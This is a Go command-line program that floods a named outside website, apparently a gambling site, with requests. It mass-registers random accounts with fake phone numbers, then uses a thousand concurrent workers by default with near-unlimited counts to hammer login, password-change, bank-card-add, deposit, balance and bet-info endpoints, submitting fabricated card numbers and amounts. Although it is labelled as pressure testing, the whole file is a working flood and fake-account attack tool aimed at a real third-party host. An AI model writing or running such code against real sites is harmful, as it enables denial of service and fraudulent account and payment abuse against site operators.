package main

import (
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

var (
	command string
	registryTimes int
	times int64
	seconds int64
	concurrency int
	logFile string
	config map[string]string
)

func RandString(len int) string {
	rand.Seed(time.Now().UnixNano())
	bytes := make([]byte, len)
	for i := 0; i < len; i++ {
		seed := rand.Intn(3)
		b := 0
		if seed == 0 {
			b = rand.Intn(26) + 65
		} else if seed == 1 {
			b = rand.Intn(10) + 48
		} else {
			b = rand.Intn(26) + 97
		}

		bytes[i] = byte(b)
	}
	return string(bytes)
}

func RandInt64(min, max int64) int64 {
	if min >= max || min == 0 || max == 0 {
		return max
	}

	rand.Seed(time.Now().UnixNano())
	return rand.Int63n(max-min) + min
}

type User struct {
	Id int `json:"Id"`
	Imei string `json:"imei"`
	Telephone uint `json:"Telephone"`
	SonId int `json:"sonid"`
	Username string `json:"username"`
	Password string `json:"pwd"`
	Nickname string `json:"nickname"`
	TradePassword int64 `json:"trade_password"`
}

func LoadUsers(logFile string) ([]*User, error) {
	usersBytes, err := ioutil.ReadFile(logFile)
	if err != nil {
		return nil, err
	}

	users := make([]*User, 1)
	if err := json.Unmarshal(usersBytes, &users); err != nil {
		return nil, err
	}

	return users, nil
}

func DumpUsers(logFile string, users []*User) error {
	usersBytes, _ := json.Marshal(users)
	fmt.Println(string(usersBytes))
	return ioutil.WriteFile(logFile, usersBytes, 0777)
}

func init() {
	runtime.GOMAXPROCS(2)
	flag.StringVar(&command, "command", "login", "命令")
	flag.StringVar(&logFile, "log-file", "user", "日志文件")
	flag.IntVar(&registryTimes, "registry-times", 10, "注册账号个数")
	flag.Int64Var(&times, "times", 100000000000, "请求次数")
	flag.Int64Var(&seconds, "seconds", 100000000000, "秒数(时长)")
	flag.IntVar(&concurrency, "concurrency", 1000, "并发数")
	config = map[string]string{
		"host": "http://5868pc.com",
		"registry": "/reg",
		"login": "/login",
		"change-message": "/user/changeMsg",
		"set-cash-password": "/user/setCashPwd",
		"change-cash-password": "/user/changeCashPwd",
		"bank-add": "/user/bankAdd",
		"money-up": "/user/moneyUp",
		"get-money": "/game/getMoney",
		"new-bet-info": "/newBetInfo",
	}
}

func main() {
	flag.Parse()
	commandHandler := map[string]func(){
		// 注册
		"registry": func() {
			var users []*User
			for i := 0; i < registryTimes; i++ {
				user := &User{
					Username: RandString(7),
					Password: RandString(7),
					Telephone: uint(RandInt64(13100000000, 13999999999)),
					SonId: int(RandInt64(7000, 7100)),
				}
				url := fmt.Sprintf("%s%s", config["host"], config["registry"])
				data := fmt.Sprintf(
					"username=%s&pwd=%s&tel=%d&sonid=%d",
					user.Username,
					user.Password,
					user.Telephone,
					user.SonId)

				response, err := http.Post(url, "application/x-www-form-urlencoded", strings.NewReader(data))
				if err != nil {
					fmt.Println(err)
					continue
				}

				responseBytes, err := ioutil.ReadAll(response.Body)
				if err != nil {
					fmt.Println(err)
					continue
				}

				fmt.Println(string(responseBytes))
				users = append(users, user)
			}

			if err := DumpUsers(logFile, users); err != nil {
				fmt.Println(err)
			}
		},
		// 登录
		"login" : func() {
			type LoginResponse struct {
				Code int `json:"code"`
				Data *User `json:"data"`
				Message string `json:"msg"`
			}

			users, err := LoadUsers(logFile)
			if err != nil {
				fmt.Println(err)
				return
			}

			for index, user := range users {
				url := fmt.Sprintf("%s%s", config["host"], config["login"])
				data := fmt.Sprintf(
					"username=%s&pwd=%s",
					users[index].Username,
					users[index].Password)

				response, err := http.Post(url, "application/x-www-form-urlencoded", strings.NewReader(data))
				if err != nil {
					fmt.Println(err)
					continue
				}

				responseBody, err := ioutil.ReadAll(response.Body)
				if err != nil {
					fmt.Println(err)
					continue
				}
				fmt.Println(string(responseBody))

				loginResponse := &LoginResponse{
					Data: user,
				}
				if err := json.Unmarshal(responseBody, loginResponse); err != nil {
					fmt.Println(err)
					continue
				}
			}

			if err := DumpUsers(logFile, users); err != nil {
				fmt.Println(err)
				return
			}
		},
		// 设置交易密码
		"set-cash-password" : func() {
			type LoginResponse struct {
				Code int `json:"code"`
				Data *User `json:"data"`
				Message string `json:"msg"`
			}

			users, err := LoadUsers(logFile)
			if err != nil {
				fmt.Println(err)
				return
			}

			for index, _ := range users {
				url := fmt.Sprintf("%s%s", config["host"], config["set-cash-password"])
				users[index].TradePassword = RandInt64(100000, 999999)
				data := fmt.Sprintf(
					"userid=%d&imei=%s&pwd=%d",
					users[index].Id,
					users[index].Imei,
					users[index].TradePassword)

				response, err := http.Post(url, "application/x-www-form-urlencoded", strings.NewReader(data))
				if err != nil {
					fmt.Println(err)
					return
				}

				responseBody, err := ioutil.ReadAll(response.Body)
				if err != nil {
					fmt.Println(err)
					return
				}

				fmt.Println(string(responseBody))
			}

			if err := DumpUsers(logFile, users); err != nil {
				fmt.Println(err)
				return
			}
		},
		"change-message-press": func() {
			users, err := LoadUsers(logFile)
			if err != nil {
				fmt.Println(err)
				return
			}

			wg := sync.WaitGroup{}
			for i := 0; i < concurrency; i++ {
				wg.Add(1)
				go func([]*User) {
					defer wg.Done()
					for  {
						if times <= 0 {
							break
						}

						count := len(users)
						rand.Seed(time.Now().UnixNano())
						index := rand.Intn(count)
						users[index].Nickname = RandString(6)
						// 发送数据注册账号
						url := fmt.Sprintf("%s%s", config["host"], config["change-message"])
						data := fmt.Sprintf(
							"userid=%d&imei=%s&nickname=%s",
							users[index].Id,
							users[index].Imei,
							users[index].Nickname)

						_, err := http.Post(url, "application/x-www-form-urlencoded", strings.NewReader(data))
						if err != nil {
							fmt.Println(err)
							continue
						}

						//responseBytes, _ := ioutil.ReadAll(response.Body)
						//fmt.Println(string(responseBytes))
						atomic.AddInt64(&times, -1)
					}
				}(users)
			}
			wg.Wait()
		},
		"registry-press": func() {
			wg := sync.WaitGroup{}
			for i := 0; i < concurrency; i++ {
				wg.Add(1)
				go func() {
					defer wg.Done()
					for  {
						if times <= 0 {
							break
						}

						// 发送数据注册账号
						url := fmt.Sprintf("%s%s", config["host"], config["registry"])
						username := RandString(7)
						password := RandString(7)
						telephone := RandInt64(13100000000, 13999999999)
						sonId := RandInt64(7000, 7100)
						data := fmt.Sprintf(
							"username=%s&pwd=%s&tel=%d&sonid=%d",
							username,
							password,
							telephone,
							sonId)

						http.Post(url, "application/x-www-form-urlencoded", strings.NewReader(data))
						atomic.AddInt64(&times, -1)
					}
				}()
			}
			wg.Wait()
		},
		"login-press": func() {
			users, err := LoadUsers(logFile)
			if err != nil {
				fmt.Println(err)
				return
			}

			wg := sync.WaitGroup{}
			for i := 0; i < concurrency; i++ {
				wg.Add(1)
				go func([]*User) {
					defer wg.Done()
					for  {
						if times <= 0 {
							break
						}

						count := len(users)
						index := rand.Intn(count)
						// 发送数据注册账号
						url := fmt.Sprintf("%s%s", config["host"], config["login"])
						data := fmt.Sprintf(
							"username=%s&pwd=%s",
							users[index].Username,
							users[index].Password)

						_, err := http.Post(url, "application/x-www-form-urlencoded", strings.NewReader(data))
						if err != nil {
							fmt.Println(err)
							continue
						}

						//responseBody, err := ioutil.ReadAll(response.Body)
						//if err != nil {
						//	fmt.Println(err)
						//	continue
						//}
						//
						//fmt.Println(string(responseBody))
						atomic.AddInt64(&times, -1)
					}
				}(users)
			}
			wg.Wait()
		},
		"set-cash-password-press": func() {
			users, err := LoadUsers(logFile)
			if err != nil {
				fmt.Println(err)
				return
			}

			wg := sync.WaitGroup{}
			for i := 0; i < concurrency; i++ {
				wg.Add(1)
				go func([]*User) {
					defer wg.Done()
					for  {
						if times <= 0 {
							break
						}

						count := len(users)
						rand.Seed(time.Now().UnixNano())
						index := rand.Intn(count)
						// 发送数据修改交易密码
						url := fmt.Sprintf("%s%s", config["host"], config["set-cash-password"])
						data := fmt.Sprintf(
							"userid=%d&imei=%s&pwd=%d",
							users[index].Id,
							users[index].Imei,
							RandInt64(100000, 999999))

						_, err := http.Post(url, "application/x-www-form-urlencoded", strings.NewReader(data))
						if err != nil {
							fmt.Println(err)
							continue
						}

						//responseBytes, _ := ioutil.ReadAll(response.Body)
						//fmt.Println(string(responseBytes))

						atomic.AddInt64(&times, -1)
					}
				}(users)
			}
			wg.Wait()
		},
		"bank-add-press": func() {
			users, err := LoadUsers(logFile)
			if err != nil {
				fmt.Println(err)
				return
			}

			wg := sync.WaitGroup{}
			for i := 0; i < concurrency; i++ {
				wg.Add(1)
				go func([]*User) {
					defer wg.Done()
					for  {
						if times <= 0 {
							break
						}

						count := len(users)
						rand.Seed(time.Now().UnixNano())
						index := rand.Intn(count)
						// 发送数据修改交易密码
						url := fmt.Sprintf("%s%s", config["host"], config["bank-add"])
						data := fmt.Sprintf(
							"userid=%d&imei=%s&banktype=2&bankname=%s&name=%s&city=%s&account=%d&phone=%d",
							users[index].Id,
							users[index].Imei,
							RandString(7),
							RandString(6),
							RandString(6),
							RandInt64(6000000000000000, 6999999999999999),
							RandInt64(13100000000, 13999999999))

						_, err := http.Post(url, "application/x-www-form-urlencoded", strings.NewReader(data))
						if err != nil {
							fmt.Println(err)
							continue
						}

						//responseBytes, _ := ioutil.ReadAll(response.Body)
						//fmt.Println(string(responseBytes))
						atomic.AddInt64(&times, -1)
					}
				}(users)
			}
			wg.Wait()
		},
		"money-up-press": func() {
			users, err := LoadUsers(logFile)
			if err != nil {
				fmt.Println(err)
				return
			}

			wg := sync.WaitGroup{}
			for i := 0; i < concurrency; i++ {
				wg.Add(1)
				go func([]*User) {
					defer wg.Done()
					for  {
						if times <= 0 {
							break
						}

						count := len(users)
						rand.Seed(time.Now().UnixNano())
						index := rand.Intn(count)
						// 发送数据充值
						url := fmt.Sprintf("%s%s", config["host"], config["money-up"])
						data := fmt.Sprintf(
							"userid=%d&imei=%s&id=34&money=%d&saccount=%s",
							users[index].Id,
							users[index].Imei,
							RandInt64(100, 10000),
							RandString(6))

						_, err := http.Post(url, "application/x-www-form-urlencoded", strings.NewReader(data))
						if err != nil {
							fmt.Println(err)
							continue
						}

						//responseBytes, _ := ioutil.ReadAll(response.Body)
						//fmt.Println(string(responseBytes))
						atomic.AddInt64(&times, -1)
					}
				}(users)
			}
			wg.Wait()
		},
		"get-money-press": func() {
			users, err := LoadUsers(logFile)
			if err != nil {
				fmt.Println(err)
				return
			}

			wg := sync.WaitGroup{}
			for i := 0; i < concurrency; i++ {
				wg.Add(1)
				go func([]*User) {
					defer wg.Done()
					for  {
						if times <= 0 {
							break
						}

						count := len(users)
						rand.Seed(time.Now().UnixNano())
						index := rand.Intn(count)
						// 发送获取余额
						url := fmt.Sprintf("%s%s", config["host"], config["get-money"])
						data := fmt.Sprintf(
							"userid=%d&imei=%s",
							users[index].Id,
							users[index].Imei)

						_, err := http.Post(url, "application/x-www-form-urlencoded", strings.NewReader(data))
						if err != nil {
							fmt.Println(err)
							continue
						}

						//responseBytes, _ := ioutil.ReadAll(response.Body)
						//fmt.Println(string(responseBytes))
						atomic.AddInt64(&times, -1)
					}
				}(users)
			}
			wg.Wait()
		},
		"new-bet-info-press": func() {
			ctx, _ := context.WithDeadline(context.Background(), time.Now().Add(time.Duration(seconds) * time.Second))
			wg := sync.WaitGroup{}
			for i := 0; i < concurrency; i++ {
				wg.Add(1)
				go func() {
					defer wg.Done()
					for  {
						select {
						case <-ctx.Done():
							return
						default:

						}

						// 发送请求
						url := fmt.Sprintf("%s%s", config["host"], config["new-bet-info"])
						_, err := http.Post(url, "application/x-www-form-urlencoded", nil)
						if err != nil {
							fmt.Println(err)
							continue
						}

						//responseBytes, _ := ioutil.ReadAll(response.Body)
						//fmt.Println(string(responseBytes))
					}
				}()
			}
			wg.Wait()
		},
	}
	commandHandler[command]()
}
